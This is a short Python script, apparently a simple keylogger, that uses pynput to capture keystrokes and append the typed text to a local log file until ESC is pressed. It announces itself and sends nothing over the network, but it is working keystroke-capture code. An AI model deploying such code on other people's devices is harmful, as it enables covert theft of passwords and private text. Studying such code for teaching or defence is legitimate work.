from pynput import keyboard
from datetime import datetime

log_file = "key_sentences_log.txt"
current_sentence = []

def write_sentence():
    global current_sentence
    sentence = ''.join(current_sentence).strip()
    if sentence:
        with open(log_file, "a") as f:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
            f.write(f"{sentence}\n")
        current_sentence = []

def on_press(key):
    global current_sentence
    try:
        if hasattr(key, 'char') and key.char is not None:
            current_sentence.append(key.char)
        elif key == keyboard.Key.space:
            current_sentence.append(' ')
            write_sentence()
        elif key == keyboard.Key.enter:
            write_sentence()
        elif key == keyboard.Key.backspace:
            if current_sentence:
                current_sentence.pop()
        elif key == keyboard.Key.esc:
            write_sentence()
            print("Logging stopped.")
            return False
    except Exception as e:
        print(f"Error: {e}")

print("Key logger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
